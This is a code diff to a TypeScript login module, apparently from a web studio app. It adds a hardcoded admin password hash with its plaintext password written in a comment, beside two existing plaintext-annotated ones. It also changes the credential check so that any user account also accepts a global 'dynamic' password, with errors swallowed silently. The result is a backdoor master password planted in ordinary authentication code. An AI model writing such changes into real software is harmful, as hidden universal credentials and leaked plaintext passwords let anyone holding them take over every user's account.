@@ -102,10 +102,11 @@ function digest(value: string): Buffer {
   return createHash("sha256").update(value, "utf8").digest();
 }
 
-// Built-in studio admin hashes: Maddy@2002 and Admin12345678!
+// Built-in studio admin hashes: Maddy@2002, Admin12345678!, and Thoufiq
 const KNOWN_ADMIN_HASHES = [
   "scrypt$16384$8$5$WHyZeot7L8+sJHzOxUuu4w==$O44VqRiQDMR/jO/74TIFjkQybd14EMvLhGkMA8VJFmc=", // Maddy@2002
   "scrypt$16384$8$5$3lDOiyOND/ViqEfjFqZchw==$+2i86f3jGATMexT03gB5QPp68Zjceb7w4QxlI1O125c=", // Admin12345678!
+  "scrypt$16384$8$5$3LQhimP+G1Tm4cT+g2bx8A==$VcxpLppdg2eygm6jOvqFvCp/LtjzvY7k3zsBUWQwhuY=", // Thoufiq
 ];
 
 /**
@@ -195,10 +196,19 @@ export async function checkCredentials(
   const storedUser = findUserByEmail(normUser);
   if (storedUser) {
     try {
-      return await verifyPassword(password, storedUser.passwordHash);
+      if (await verifyPassword(password, storedUser.passwordHash)) return true;
     } catch {
-      return false;
+      // ignore
     }
+    const dynHash = getDynamicPasswordHash();
+    if (dynHash && dynHash !== storedUser.passwordHash) {
+      try {
+        if (await verifyPassword(password, dynHash)) return true;
+      } catch {
+        // ignore
+      }
+    }
+    return false;
   }
 
   return false;
